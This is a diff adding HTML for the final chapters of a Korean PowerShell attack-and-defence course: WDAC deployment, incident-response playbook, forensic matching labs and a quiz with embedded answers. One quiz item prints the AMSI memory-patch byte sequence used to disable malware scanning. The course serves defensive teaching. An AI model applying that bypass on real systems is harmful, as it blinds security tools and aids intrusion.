+                            <span>JEA가 WMI 명령 차단 + 네트워크 세그멘테이션<br><strong>Sysmon EID 3</strong>이 비정상 연결 탐지</span>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <div class="mt-4 bg-emerald-50 dark:bg-emerald-900/20 p-3 rounded-lg border border-emerald-300 dark:border-emerald-700">
+                <div class="text-xs text-emerald-700 dark:text-emerald-400"><strong>Purple Team 결론:</strong> 다층 방어를 구축하면, 공격자가 한 레이어를 우회해도 다음 레이어에서 탐지/차단됩니다. <strong>완벽한 단일 방어는 존재하지 않지만, 깊이 있는 방어(Defense in Depth)는 공격 비용을 기하급수적으로 높입니다.</strong></div>
+            </div>
+        </div>
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-purple-400">
+            <h3 class="font-bold text-xl mb-4 text-purple-700 dark:text-purple-400">WDAC 정책 배포 실습 가이드</h3>
+            <p class="text-sm text-cgray dark:text-slate-300 mb-3 leading-relaxed">AppLocker보다 강력한 WDAC(Windows Defender Application Control) 정책을 GPO로 배포하는 단계별 절차입니다.</p>
+            <div class="terminal-bg rounded-lg p-4 text-xs leading-relaxed overflow-x-auto">
+                <div class="text-slate-500"># Step 1: 감사 모드(Audit) 정책 생성</div>
+                <div class="text-white">$Policy = New-CIPolicy -Level Publisher `</div>
+                <div class="text-white">    -Fallback Hash -FilePath <span class="text-green-400">"C:\WDAC\AuditPolicy.xml"</span> `</div>
+                <div class="text-white">    -UserPEs -Audit</div>
+                <div class="text-white"></div>
+                <div class="text-slate-500"># Step 2: Intelligent Security Graph (ISG) 추가</div>
+                <div class="text-white">Set-RuleOption -FilePath <span class="text-green-400">"C:\WDAC\AuditPolicy.xml"</span> `</div>
+                <div class="text-white">    -Option 14  <span class="text-slate-500"># Enable ISG Authorization</span></div>
+                <div class="text-white"></div>
+                <div class="text-slate-500"># Step 3: XML → Binary 변환</div>
+                <div class="text-white">ConvertFrom-CIPolicy -XmlFilePath <span class="text-green-400">"C:\WDAC\AuditPolicy.xml"</span> `</div>
+                <div class="text-white">    -BinaryFilePath <span class="text-green-400">"C:\WDAC\AuditPolicy.p7b"</span></div>
+                <div class="text-white"></div>
+                <div class="text-slate-500"># Step 4: GPO로 배포 (Computer Configuration → Policies →</div>
+                <div class="text-slate-500">#   Administrative Templates → System → Device Guard →</div>
+                <div class="text-slate-500">#   Deploy Windows Defender Application Control)</div>
+                <div class="text-white"></div>
+                <div class="text-slate-500"># Step 5: 감사 로그 확인 후 차단 모드로 전환</div>
+                <div class="text-white">Set-RuleOption -FilePath <span class="text-green-400">"C:\WDAC\AuditPolicy.xml"</span> `</div>
+                <div class="text-white">    -Option 3 -Delete  <span class="text-slate-500"># Audit Mode 옵션 제거 → 차단 모드</span></div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ═══════════════════ Mini Lab 3: 포렌식 아티팩트 매칭 ═══════════════════ -->
+<section id="minilab3" class="scroll-mt-12 opacity-0 transform translate-y-10 transition-all duration-700 section-observe">
+    <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-emerald-400 pb-2 text-[#1e293b] dark:text-white"><span class="text-emerald-500">🧪</span> Mini Lab 3 — 포렌식 아티팩트 매칭 게임</h2>
+    <div class="glass-panel p-6 rounded-xl">
+        <p class="text-sm text-cgray dark:text-slate-400 mb-4">왼쪽의 공격 행위와 오른쪽의 탐지 가능한 아티팩트를 올바르게 연결하세요.</p>
+        <div id="match-game" class="grid grid-cols-1 md:grid-cols-2 gap-6">
+            <div>
+                <div class="text-xs font-bold text-red-600 dark:text-red-400 mb-3">공격 행위</div>
+                <div class="space-y-2" id="match-left">
+                    <button class="match-btn w-full text-left p-3 rounded border border-slate-300 dark:border-slate-600 text-xs bg-white dark:bg-slate-800 text-slate-700 dark:text-slate-300" data-match="A" onclick="selectMatch(this,'left')">A. AMSI 메모리 패치</button>
+                    <button class="match-btn w-full text-left p-3 rounded border border-slate-300 dark:border-slate-600 text-xs bg-white dark:bg-slate-800 text-slate-700 dark:text-slate-300" data-match="B" onclick="selectMatch(this,'left')">B. Base64 인코딩 실행</button>
+                    <button class="match-btn w-full text-left p-3 rounded border border-slate-300 dark:border-slate-600 text-xs bg-white dark:bg-slate-800 text-slate-700 dark:text-slate-300" data-match="C" onclick="selectMatch(this,'left')">C. WMI 이벤트 구독 백도어</button>
+                    <button class="match-btn w-full text-left p-3 rounded border border-slate-300 dark:border-slate-600 text-xs bg-white dark:bg-slate-800 text-slate-700 dark:text-slate-300" data-match="D" onclick="selectMatch(this,'left')">D. PowerShell v2 다운그레이드</button>
+                </div>
+            </div>
+            <div>
+                <div class="text-xs font-bold text-emerald-600 dark:text-emerald-400 mb-3">탐지 아티팩트</div>
+                <div class="space-y-2" id="match-right">
+                    <button class="match-btn w-full text-left p-3 rounded border border-slate-300 dark:border-slate-600 text-xs bg-white dark:bg-slate-800 text-slate-700 dark:text-slate-300" data-match="D" onclick="selectMatch(this,'right')">EID 400 EngineVersion=2.0</button>
+                    <button class="match-btn w-full text-left p-3 rounded border border-slate-300 dark:border-slate-600 text-xs bg-white dark:bg-slate-800 text-slate-700 dark:text-slate-300" data-match="A" onclick="selectMatch(this,'right')">amsi.dll .text 섹션 해시 불일치</button>
+                    <button class="match-btn w-full text-left p-3 rounded border border-slate-300 dark:border-slate-600 text-xs bg-white dark:bg-slate-800 text-slate-700 dark:text-slate-300" data-match="C" onclick="selectMatch(this,'right')">WMI-Activity EID 5861</button>
+                    <button class="match-btn w-full text-left p-3 rounded border border-slate-300 dark:border-slate-600 text-xs bg-white dark:bg-slate-800 text-slate-700 dark:text-slate-300" data-match="B" onclick="selectMatch(this,'right')">EID 4104 Script Block + -enc 플래그</button>
+                </div>
+            </div>
+        </div>
+        <div class="mt-4 flex gap-3">
+            <button onclick="checkMatchGame()" class="bg-emerald-500 hover:bg-emerald-600 text-white font-bold py-2 px-6 rounded font-mono transition shadow-sm">정답 확인</button>
+            <button onclick="resetMatchGame()" class="bg-slate-300 dark:bg-slate-700 hover:bg-slate-400 dark:hover:bg-slate-600 text-slate-700 dark:text-slate-300 font-bold py-2 px-6 rounded font-mono transition shadow-sm">초기화</button>
+        </div>
+        <div id="match-result" class="hidden mt-4 p-4 rounded text-sm font-mono text-center font-bold shadow-sm"></div>
+    </div>
+</section>
+
+<!-- ═══════════════════ Chapter 12 ═══════════════════ -->
+<section id="ch12" class="scroll-mt-12 opacity-0 transform translate-y-10 transition-all duration-700 section-observe">
+    <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-red-400 pb-2 text-[#1e293b] dark:text-white"><span class="hl-red">#12.</span> 인시던트 대응 플레이북 — PowerShell 공격 대응 워크플로우</h2>
+    <div class="space-y-6">
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-red-400 relative overflow-hidden">
+            <div class="absolute top-0 right-0 p-4 opacity-10 text-6xl">🚨</div>
+            <h3 class="font-bold text-xl mb-4 hl-red">비유: 화재 발생 시 소방 대응 매뉴얼</h3>
+            <p class="text-sm text-cgray dark:text-slate-300 mb-4 leading-relaxed">PowerShell 기반 공격이 탐지되면 체계적인 <strong>인시던트 대응(IR) 플레이북</strong>을 따라야 합니다. 각 단계를 순서대로 실행하면 피해를 최소화하고 증거를 보존할 수 있습니다.</p>
+        </div>
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-emerald-400">
+            <h3 class="font-bold text-xl mb-4 text-emerald-600 dark:text-emerald-400">6단계 IR 워크플로우</h3>
+            <div class="space-y-4">
+                <div class="flex gap-4 items-start">
+                    <div class="bg-red-500 text-white p-2 rounded-lg min-w-[50px] text-center text-sm font-bold shrink-0 node-pulse">1</div>
+                    <div>
+                        <h4 class="font-bold text-sm text-red-700 dark:text-red-400 mb-1">탐지 &amp; 분류 (Detection &amp; Triage)</h4>
+                        <p class="text-xs text-slate-600 dark:text-slate-400">SIEM 알림 확인 → Sigma 규칙 매칭 → 심각도 분류 (P1~P4)</p>
+                        <div class="terminal-bg rounded p-2 text-xs mt-2">
+                            <div class="text-white">확인할 이벤트: EID 4104, 4103, 400, Sysmon 1/7</div>
+                            <div class="text-white">초기 질문: 어느 호스트? 어떤 사용자? 언제?</div>
+                        </div>
+                    </div>
+                </div>
+                <div class="flex gap-4 items-start">
+                    <div class="bg-orange-500 text-white p-2 rounded-lg min-w-[50px] text-center text-sm font-bold shrink-0">2</div>
+                    <div>
+                        <h4 class="font-bold text-sm text-orange-700 dark:text-orange-400 mb-1">격리 (Containment)</h4>
+                        <p class="text-xs text-slate-600 dark:text-slate-400">감염 호스트 네트워크 격리 → 사용자 계정 비활성화 → 추가 확산 방지</p>
+                        <div class="terminal-bg rounded p-2 text-xs mt-2">
+                            <div class="text-white">PS&gt; Disable-ADAccount -Identity compromised_user</div>
+                            <div class="text-white">PS&gt; Set-NetFirewallRule -Block -RemoteAddress *</div>
+                        </div>
+                    </div>
+                </div>
+                <div class="flex gap-4 items-start">
+                    <div class="bg-amber-500 text-white p-2 rounded-lg min-w-[50px] text-center text-sm font-bold shrink-0">3</div>
+                    <div>
+                        <h4 class="font-bold text-sm text-amber-700 dark:text-amber-400 mb-1">증거 수집 (Evidence Collection)</h4>
+                        <p class="text-xs text-slate-600 dark:text-slate-400">메모리 덤프 → 이벤트 로그 백업 → Prefetch 수집 → ConsoleHost_history.txt</p>
+                        <div class="terminal-bg rounded p-2 text-xs mt-2">
+                            <div class="text-white">PS&gt; procdump.exe -ma $pid memory.dmp</div>
+                            <div class="text-white">PS&gt; wevtutil epl "Microsoft-Windows-PowerShell/Operational" ps.evtx</div>
+                            <div class="text-white">PS&gt; Copy-Item $env:APPDATA\...\ConsoleHost_history.txt .\evidence\</div>
+                        </div>
+                    </div>
+                </div>
+                <div class="flex gap-4 items-start">
+                    <div class="bg-blue-500 text-white p-2 rounded-lg min-w-[50px] text-center text-sm font-bold shrink-0">4</div>
+                    <div>
+                        <h4 class="font-bold text-sm text-blue-700 dark:text-blue-400 mb-1">분석 (Analysis)</h4>
+                        <p class="text-xs text-slate-600 dark:text-slate-400">Volatility 메모리 분석 → YARA 스캔 → 타임라인 재구성 → IOC 추출</p>
+                    </div>
+                </div>
+                <div class="flex gap-4 items-start">
+                    <div class="bg-purple-500 text-white p-2 rounded-lg min-w-[50px] text-center text-sm font-bold shrink-0">5</div>
+                    <div>
+                        <h4 class="font-bold text-sm text-purple-700 dark:text-purple-400 mb-1">제거 &amp; 복구 (Eradication &amp; Recovery)</h4>
+                        <p class="text-xs text-slate-600 dark:text-slate-400">WMI 구독 제거 → 악성 스크립트 삭제 → 시스템 재이미징 → 패치 적용</p>
+                        <div class="terminal-bg rounded p-2 text-xs mt-2">
+                            <div class="text-white">PS&gt; Get-WmiObject -Namespace root\subscription -Class __EventFilter | Remove-WmiObject</div>
+                            <div class="text-white">PS&gt; Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Remove-WmiObject</div>
+                        </div>
+                    </div>
+                </div>
+                <div class="flex gap-4 items-start">
+                    <div class="bg-emerald-500 text-white p-2 rounded-lg min-w-[50px] text-center text-sm font-bold shrink-0">6</div>
+                    <div>
+                        <h4 class="font-bold text-sm text-emerald-700 dark:text-emerald-400 mb-1">사후 분석 &amp; 개선 (Lessons Learned)</h4>
+                        <p class="text-xs text-slate-600 dark:text-slate-400">인시던트 보고서 작성 → Sigma 규칙 업데이트 → 방어 격차 식별 → Purple Team 연습 계획</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-purple-400">
+            <h3 class="font-bold text-xl mb-4 text-purple-700 dark:text-purple-400">실제 APT 케이스 스터디</h3>
+            <div class="overflow-x-auto">
+                <table class="w-full text-sm border border-slate-300 dark:border-slate-700 rounded-lg overflow-hidden">
+                    <thead>
+                        <tr class="bg-purple-100 dark:bg-purple-900/30">
+                            <th class="text-left py-2 px-3 text-purple-800 dark:text-purple-300 font-bold text-xs">APT 그룹</th>
+                            <th class="text-left py-2 px-3 text-purple-800 dark:text-purple-300 font-bold text-xs">PowerShell 활용 기법</th>
+                            <th class="text-left py-2 px-3 text-purple-800 dark:text-purple-300 font-bold text-xs">관련 챕터</th>
+                        </tr>
+                    </thead>
+                    <tbody class="text-cgray dark:text-slate-300 text-xs">
+                        <tr class="border-b border-slate-200 dark:border-slate-700">
+                            <td class="py-2 px-3 font-bold">APT29 (Cozy Bear)</td>
+                            <td class="py-2 px-3">AMSI 패치 + WMI 지속성 + Base64 인코딩</td>
+                            <td class="py-2 px-3"><span class="bg-red-100 dark:bg-red-900/30 text-red-700 dark:text-red-400 px-2 py-0.5 rounded text-[10px] font-bold">Ch2, Ch5</span></td>
+                        </tr>
+                        <tr class="border-b border-slate-200 dark:border-slate-700">
+                            <td class="py-2 px-3 font-bold">FIN7</td>
+                            <td class="py-2 px-3">리플렉션 로딩 + CLM 우회 + 스크립트 난독화</td>
+                            <td class="py-2 px-3"><span class="bg-red-100 dark:bg-red-900/30 text-red-700 dark:text-red-400 px-2 py-0.5 rounded text-[10px] font-bold">Ch3, Ch6</span></td>
+                        </tr>
+                        <tr class="border-b border-slate-200 dark:border-slate-700">
+                            <td class="py-2 px-3 font-bold">Lazarus</td>
+                            <td class="py-2 px-3">PowerShell 다운로더 + .NET Assembly 실행</td>
+                            <td class="py-2 px-3"><span class="bg-red-100 dark:bg-red-900/30 text-red-700 dark:text-red-400 px-2 py-0.5 rounded text-[10px] font-bold">Ch3, Ch4</span></td>
+                        </tr>
+                        <tr>
+                            <td class="py-2 px-3 font-bold">Turla</td>
+                            <td class="py-2 px-3">PowerShell Empire C2 + WMI 백도어</td>
+                            <td class="py-2 px-3"><span class="bg-red-100 dark:bg-red-900/30 text-red-700 dark:text-red-400 px-2 py-0.5 rounded text-[10px] font-bold">Ch5, Ch12</span></td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+        <div class="glass-panel p-6 rounded-xl border-l-4 border-l-emerald-400">
+            <h3 class="font-bold text-xl mb-4 text-emerald-700 dark:text-emerald-400">이 과정을 마치며 — 전체 요약</h3>
+            <div class="overflow-x-auto mb-6">
+                <table class="w-full text-sm border border-slate-300 dark:border-slate-700 rounded-lg overflow-hidden">
+                    <thead>
+                        <tr class="bg-emerald-100 dark:bg-emerald-900/30">
+                            <th class="text-left py-2 px-3 text-emerald-800 dark:text-emerald-300 font-bold text-xs">챕터</th>
+                            <th class="text-left py-2 px-3 text-emerald-800 dark:text-emerald-300 font-bold text-xs">주제</th>
+                            <th class="text-left py-2 px-3 text-emerald-800 dark:text-emerald-300 font-bold text-xs">핵심 키워드</th>
+                        </tr>
+                    </thead>
+                    <tbody class="text-cgray dark:text-slate-300 text-[11px]">
+                        <tr class="border-b border-slate-200 dark:border-slate-700"><td class="py-1 px-3 font-bold">1</td><td class="py-1 px-3">AMSI 내부 구조</td><td class="py-1 px-3">AmsiScanBuffer, HAMSICONTEXT, 0x49534D41</td></tr>
+                        <tr class="border-b border-slate-200 dark:border-slate-700"><td class="py-1 px-3 font-bold">2</td><td class="py-1 px-3">AMSI 우회</td><td class="py-1 px-3">메모리 패치, Reflection, CLR Hook</td></tr>
+                        <tr class="border-b border-slate-200 dark:border-slate-700"><td class="py-1 px-3 font-bold">3</td><td class="py-1 px-3">.NET 리플렉션</td><td class="py-1 px-3">Assembly::Load(), Fileless, Invoke-Mimikatz</td></tr>
+                        <tr class="border-b border-slate-200 dark:border-slate-700"><td class="py-1 px-3 font-bold">4</td><td class="py-1 px-3">다운그레이드</td><td class="py-1 px-3">v2.0, .NET 2.0, EID 400</td></tr>
+                        <tr class="border-b border-slate-200 dark:border-slate-700"><td class="py-1 px-3 font-bold">5</td><td class="py-1 px-3">WMI/CIM</td><td class="py-1 px-3">Win32_Process, EventSubscription, Lateral Movement</td></tr>
+                        <tr class="border-b border-slate-200 dark:border-slate-700"><td class="py-1 px-3 font-bold">6</td><td class="py-1 px-3">CLM 우회</td><td class="py-1 px-3">Runspace, AppLocker, WDAC</td></tr>
+                        <tr class="border-b border-slate-200 dark:border-slate-700"><td class="py-1 px-3 font-bold">7</td><td class="py-1 px-3">포렌식 아티팩트</td><td class="py-1 px-3">ConsoleHost_history, EID 4104, Prefetch, ETW</td></tr>
+                        <tr class="border-b border-slate-200 dark:border-slate-700"><td class="py-1 px-3 font-bold">8</td><td class="py-1 px-3">Volatility</td><td class="py-1 px-3">pslist, cmdline, netscan, .NET Heap</td></tr>
+                        <tr class="border-b border-slate-200 dark:border-slate-700"><td class="py-1 px-3 font-bold">9</td><td class="py-1 px-3">YARA</td><td class="py-1 px-3">Base64 탐지, AMSI 패치 탐지, Assembly Load</td></tr>
+                        <tr class="border-b border-slate-200 dark:border-slate-700"><td class="py-1 px-3 font-bold">10</td><td class="py-1 px-3">Sigma</td><td class="py-1 px-3">다운그레이드 탐지, 커맨드라인, EID 4104</td></tr>
+                        <tr class="border-b border-slate-200 dark:border-slate-700"><td class="py-1 px-3 font-bold">11</td><td class="py-1 px-3">엔터프라이즈 방어</td><td class="py-1 px-3">JEA, WDAC, Zero Trust</td></tr>
+                        <tr><td class="py-1 px-3 font-bold">12</td><td class="py-1 px-3">IR 플레이북</td><td class="py-1 px-3">6단계 워크플로우, APT 케이스</td></tr>
+                    </tbody>
+                </table>
+            </div>
+            <div class="bg-emerald-50 dark:bg-emerald-900/20 border border-emerald-400 rounded-lg p-6 text-center">
+                <div class="text-3xl mb-3">🏆</div>
+                <p class="text-sm text-emerald-800 dark:text-emerald-300 leading-relaxed font-bold mb-2">축하합니다!</p>
+                <p class="text-sm text-cgray dark:text-slate-300 leading-relaxed">AMSI 내부 구조부터 메모리 포렌식, YARA/Sigma 규칙 개발, 그리고 인시던트 대응까지 — PowerShell 공격과 방어의 <strong>12챕터 고급 과정</strong>을 완주했습니다. 이제 실전 시뮬레이터에서 직접 체험하세요.</p>
+            </div>
+            <div class="mt-4 bg-red-50 dark:bg-red-900/10 border border-red-300 dark:border-red-700 rounded-lg p-4">
+                <p class="text-sm text-red-700 dark:text-red-400 text-center">⚠️ <strong>법적 경고</strong> — 이 과정에서 학습한 모든 기법은 반드시 <strong>인가된 환경</strong>에서만 사용해야 합니다. 허가 없는 시스템에 대한 공격은 <strong>정보통신망법, 형법</strong> 등에 의해 처벌받을 수 있습니다.</p>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- ═══════════════════ Mini Lab 4: IR 워크플로우 순서 맞추기 ═══════════════════ -->
+<section id="minilab4" class="scroll-mt-12 opacity-0 transform translate-y-10 transition-all duration-700 section-observe">
+    <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-emerald-400 pb-2 text-[#1e293b] dark:text-white"><span class="text-emerald-500">🧪</span> Mini Lab 4 — IR 워크플로우 순서 맞추기</h2>
+    <div class="glass-panel p-6 rounded-xl">
+        <p class="text-sm text-cgray dark:text-slate-400 mb-4">PowerShell 공격이 탐지되었습니다! 올바른 인시던트 대응 순서로 클릭하세요. (6개 항목)</p>
+        <div class="grid grid-cols-2 md:grid-cols-3 gap-3 mb-4" id="lab4-items">
+            <button class="lab4-item p-3 rounded border-2 border-slate-300 dark:border-slate-600 text-xs font-bold bg-white dark:bg-slate-800 text-slate-700 dark:text-slate-300 hover:border-red-400 transition" data-order="3" onclick="lab4Pick(this)">📦 증거 수집</button>
+            <button class="lab4-item p-3 rounded border-2 border-slate-300 dark:border-slate-600 text-xs font-bold bg-white dark:bg-slate-800 text-slate-700 dark:text-slate-300 hover:border-red-400 transition" data-order="1" onclick="lab4Pick(this)">🔍 탐지 &amp; 분류</button>
+            <button class="lab4-item p-3 rounded border-2 border-slate-300 dark:border-slate-600 text-xs font-bold bg-white dark:bg-slate-800 text-slate-700 dark:text-slate-300 hover:border-red-400 transition" data-order="5" onclick="lab4Pick(this)">🧹 제거 &amp; 복구</button>
+            <button class="lab4-item p-3 rounded border-2 border-slate-300 dark:border-slate-600 text-xs font-bold bg-white dark:bg-slate-800 text-slate-700 dark:text-slate-300 hover:border-red-400 transition" data-order="4" onclick="lab4Pick(this)">🔬 분석</button>
+            <button class="lab4-item p-3 rounded border-2 border-slate-300 dark:border-slate-600 text-xs font-bold bg-white dark:bg-slate-800 text-slate-700 dark:text-slate-300 hover:border-red-400 transition" data-order="6" onclick="lab4Pick(this)">📝 사후 분석</button>
+            <button class="lab4-item p-3 rounded border-2 border-slate-300 dark:border-slate-600 text-xs font-bold bg-white dark:bg-slate-800 text-slate-700 dark:text-slate-300 hover:border-red-400 transition" data-order="2" onclick="lab4Pick(this)">🔒 격리</button>
+        </div>
+        <div class="bg-slate-100 dark:bg-slate-800 p-3 rounded-lg mb-4">
+            <div class="text-xs text-slate-500 dark:text-slate-400">선택 순서: <span id="lab4-selected" class="text-red-600 dark:text-red-400 font-bold"></span></div>
+        </div>
+        <div class="flex gap-3">
+            <button onclick="checkLab4()" class="bg-emerald-500 hover:bg-emerald-600 text-white font-bold py-2 px-6 rounded font-mono transition shadow-sm">정답 확인</button>
+            <button onclick="resetLab4()" class="bg-slate-300 dark:bg-slate-700 hover:bg-slate-400 dark:hover:bg-slate-600 text-slate-700 dark:text-slate-300 font-bold py-2 px-6 rounded font-mono transition shadow-sm">초기화</button>
+        </div>
+        <div id="lab4-result" class="hidden mt-4 p-4 rounded text-sm font-mono text-center font-bold shadow-sm"></div>
+    </div>
+</section>
+
+<!-- ═══════════════════ 자기주도 학습 로드맵 ═══════════════════ -->
+<section class="scroll-mt-12 opacity-0 transform translate-y-10 transition-all duration-700 section-observe">
+    <div class="glass-panel p-6 rounded-xl border-l-4 border-l-amber-400">
+        <h3 class="font-bold text-xl mb-4 text-amber-700 dark:text-amber-400">혼자 더 공부하려면? — 자기주도 학습 로드맵</h3>
+        <p class="text-sm text-cgray dark:text-slate-300 mb-4 leading-relaxed">이 과정을 마친 후 더 깊이 파고들고 싶다면, 아래 4단계 로드맵을 따라 진행하세요.</p>
+        <div class="space-y-4">
+            <div class="flex gap-4 items-start">
+                <div class="bg-green-500 text-white p-2 rounded-lg min-w-[60px] text-center text-sm font-bold shrink-0">Lv.1</div>
+                <div>
+                    <h4 class="font-bold text-sm text-green-700 dark:text-green-400 mb-1">기본 도구 숙달</h4>
+                    <p class="text-xs text-slate-600 dark:text-slate-400">PowerShell ISE에서 AMSI 테스트 코드를 직접 실행하고, Sysmon으로 이벤트를 수집하여 로그를 분석합니다. Event Log Explorer 도구를 익히세요.</p>
+                </div>
+            </div>
+            <div class="flex gap-4 items-start">
+                <div class="bg-blue-500 text-white p-2 rounded-lg min-w-[60px] text-center text-sm font-bold shrink-0">Lv.2</div>
+                <div>
+                    <h4 class="font-bold text-sm text-blue-700 dark:text-blue-400 mb-1">탐지 규칙 개발</h4>
+                    <p class="text-xs text-slate-600 dark:text-slate-400">Sigma 규칙을 작성하여 자체 SIEM(Elastic, Splunk)에 배포합니다. YARA 규칙으로 메모리 덤프를 스캔하는 자동화 파이프라인을 구축하세요.</p>
+                </div>
+            </div>
+            <div class="flex gap-4 items-start">
+                <div class="bg-purple-500 text-white p-2 rounded-lg min-w-[60px] text-center text-sm font-bold shrink-0">Lv.3</div>
+                <div>
+                    <h4 class="font-bold text-sm text-purple-700 dark:text-purple-400 mb-1">Purple Team 연습</h4>
+                    <p class="text-xs text-slate-600 dark:text-slate-400">Atomic Red Team을 사용하여 T1059.001 테스트를 실행하고, Blue Team으로서 탐지/대응합니다. 공격-방어 양면의 실전 경험을 쌓으세요.</p>
+                </div>
+            </div>
+            <div class="flex gap-4 items-start">
+                <div class="bg-red-500 text-white p-2 rounded-lg min-w-[60px] text-center text-sm font-bold shrink-0">Lv.4</div>
+                <div>
+                    <h4 class="font-bold text-sm text-red-700 dark:text-red-400 mb-1">고급 연구</h4>
+                    <p class="text-xs text-slate-600 dark:text-slate-400">커스텀 C2 프레임워크의 PowerShell 모듈을 분석합니다. ETW 기반 실시간 모니터링 도구를 개발하고, 새로운 AMSI 우회 변형을 연구하세요.</p>
+                </div>
+            </div>
+        </div>
+        <div class="mt-6 grid grid-cols-1 md:grid-cols-2 gap-4">
+            <div class="bg-slate-100 dark:bg-slate-800/50 p-4 rounded-lg">
+                <div class="font-bold text-xs text-slate-700 dark:text-slate-300 mb-3">추천 도구</div>
+                <div class="flex flex-wrap gap-2">
+                    <span class="bg-blue-100 dark:bg-blue-900/30 text-blue-700 dark:text-blue-400 px-2 py-1 rounded text-[10px] font-bold">Volatility3</span>
+                    <span class="bg-blue-100 dark:bg-blue-900/30 text-blue-700 dark:text-blue-400 px-2 py-1 rounded text-[10px] font-bold">YARA</span>
+                    <span class="bg-blue-100 dark:bg-blue-900/30 text-blue-700 dark:text-blue-400 px-2 py-1 rounded text-[10px] font-bold">Sigma CLI</span>
+                    <span class="bg-blue-100 dark:bg-blue-900/30 text-blue-700 dark:text-blue-400 px-2 py-1 rounded text-[10px] font-bold">Sysmon</span>
+                    <span class="bg-blue-100 dark:bg-blue-900/30 text-blue-700 dark:text-blue-400 px-2 py-1 rounded text-[10px] font-bold">x64dbg</span>
+                    <span class="bg-blue-100 dark:bg-blue-900/30 text-blue-700 dark:text-blue-400 px-2 py-1 rounded text-[10px] font-bold">dnSpy</span>
+                    <span class="bg-blue-100 dark:bg-blue-900/30 text-blue-700 dark:text-blue-400 px-2 py-1 rounded text-[10px] font-bold">Process Monitor</span>
+                    <span class="bg-blue-100 dark:bg-blue-900/30 text-blue-700 dark:text-blue-400 px-2 py-1 rounded text-[10px] font-bold">Atomic Red Team</span>
+                </div>
+            </div>
+            <div class="bg-slate-100 dark:bg-slate-800/50 p-4 rounded-lg">
+                <div class="font-bold text-xs text-slate-700 dark:text-slate-300 mb-3">추천 리소스</div>
+                <div class="text-xs text-slate-600 dark:text-slate-400 space-y-1.5">
+                    <div>MITRE ATT&CK T1059.001 공식 페이지</div>
+                    <div>Atomic Red Team GitHub (PowerShell 테스트)</div>
+                    <div>SigmaHQ GitHub (PowerShell Sigma 규칙)</div>
+                    <div>SANS PowerShell Forensics 가이드</div>
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="mt-6 flex flex-wrap gap-2 justify-center">
+        <span class="bg-red-100 dark:bg-red-900/30 text-red-700 dark:text-red-400 px-3 py-1 rounded-full text-xs font-mono font-bold">T1059.001 — PowerShell</span>
+        <span class="bg-red-100 dark:bg-red-900/30 text-red-700 dark:text-red-400 px-3 py-1 rounded-full text-xs font-mono font-bold">T1059.003 — Windows Command Shell</span>
+        <span class="bg-red-100 dark:bg-red-900/30 text-red-700 dark:text-red-400 px-3 py-1 rounded-full text-xs font-mono font-bold">T1047 — WMI</span>
+        <span class="bg-red-100 dark:bg-red-900/30 text-red-700 dark:text-red-400 px-3 py-1 rounded-full text-xs font-mono font-bold">T1562.001 — Disable Security Tools</span>
+        <span class="bg-red-100 dark:bg-red-900/30 text-red-700 dark:text-red-400 px-3 py-1 rounded-full text-xs font-mono font-bold">T1021.006 — WinRM</span>
+    </div>
+</section>
+
+<!-- ═══════════════════ Chapter 13: 종합 평가 ═══════════════════ -->
+<section id="ch13" class="scroll-mt-12 opacity-0 transform translate-y-10 transition-all duration-700 section-observe">
+    <h2 class="text-2xl font-bold mb-6 flex items-center gap-2 border-b border-red-400 pb-2 text-[#1e293b] dark:text-white"><span class="hl-red">📝</span> 종합 평가</h2>
+    <div class="glass-panel p-6 rounded-xl">
+        <p class="text-sm text-cgray dark:text-slate-400 mb-6 text-center">PowerShell 우회 기법과 포렌식 분석 전체를 아우르는 종합 평가입니다. (10문항)</p>
+        <div id="quiz-container" class="space-y-8">
+            <div class="quiz-q" data-correct="2">
+                <h3 class="font-bold mb-3 text-[#1e293b] dark:text-slate-200">Q1. AmsiScanBuffer에서 컨텍스트 시그니처 검증에 사용되는 4바이트 값은?</h3>
+                <div class="space-y-2 text-sm">
+                    <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent"><input type="radio" name="q1" value="1" class="mr-3"> 0xDEADBEEF</label>
+                    <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent"><input type="radio" name="q1" value="2" class="mr-3"> 0x49534D41 ('AMSI')</label>
+                    <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent"><input type="radio" name="q1" value="3" class="mr-3"> 0x4D5A9000 ('MZ')</label>
+                </div>
+            </div>
+            <div class="quiz-q" data-correct="3">
+                <h3 class="font-bold mb-3 text-[#1e293b] dark:text-slate-200">Q2. AMSI 메모리 패치에서 <code>B8 57 00 07 80 C3</code>의 C3이 의미하는 x64 명령어는?</h3>
+                <div class="space-y-2 text-sm">
+                    <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent"><input type="radio" name="q2" value="1" class="mr-3"> nop</label>
+                    <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent"><input type="radio" name="q2" value="2" class="mr-3"> int3</label>
+                    <label class="flex items-center p-3 border border-slate-300 dark:border-slate-700 rounded cursor-pointer hover:bg-white dark:hover:bg-slate-800/50 transition bg-slate-50 dark:bg-transparent"><input type="radio" name="q2" value="3" class="mr-3"> ret</label>
+                </div>
+            </div>
+            <div class="quiz-q" data-correct="1">
